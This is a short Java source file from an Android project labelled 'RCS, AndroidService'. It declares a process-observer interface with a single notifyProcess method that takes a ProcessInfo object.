/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Observer.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.interfaces;

import com.android.dvci.ProcessInfo;

public interface IProcessObserver<ProcessInfo> {
	void notifyProcess(com.android.dvci.ProcessInfo b);
}
